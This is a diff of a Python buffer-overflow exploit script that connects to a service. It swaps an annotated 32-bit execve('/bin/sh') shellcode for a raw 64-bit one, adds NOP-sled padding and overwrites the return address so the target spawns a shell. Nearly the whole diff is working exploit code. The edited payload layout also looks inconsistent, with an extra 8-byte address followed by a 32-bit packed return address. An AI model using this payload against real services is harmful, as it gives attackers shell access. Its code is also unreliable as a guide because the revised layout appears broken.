@@ -3,20 +3,14 @@ import socket
 import struct
 import time
 
+def pad_payload(payload: bytes, target_len: int) -> bytes:
+    padding_len = target_len - len(payload)
+    return payload + b"\x90" * padding_len
 # Shellcode: execve("/bin/sh", NULL, NULL)
 # This is a standard x86 Linux shellcode
-shellcode = (
-    b"\x31\xc0"              # xor eax,eax
-    b"\x50"                  # push eax
-    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
-    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
-    b"\x89\xe3"              # mov ebx,esp
-    b"\x50"                  # push eax
-    b"\x53"                  # push ebx
-    b"\x89\xe1"              # mov ecx,esp
-    b"\xb0\x0b"              # mov al,0xb
-    b"\xcd\x80"              # int 0x80
-)
+s= b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
+shellcode = pad_payload(s, 308)
+shellcode+= b"\x68\x0E\x01\x76\xB7\x7C\x00\x00"
 
 def exploit():
     # Connect to the service
@@ -37,17 +31,7 @@ def exploit():
     buffer_addr = 0x804c000  # This is an example - you'll need the actual address
     
     # Build the payload
-    payload = b""
-    
-    # Stage 1: Place shellcode at the beginning of our input
-    payload += shellcode
-    
-    # Pad with NOPs to reach the return address
-    # We need 300 bytes to fill local_buf + 4 bytes for saved ebp = 304 bytes
-    payload += b"\x90" * (304 - len(payload))  # NOP sled
-    
-    # Overwrite saved EBP (4 bytes)
-    payload += b"BBBB"
+    payload = shellcode
     
     # Overwrite return address - jump to our shellcode in the global buffer
     payload += struct.pack("<I", buffer_addr)
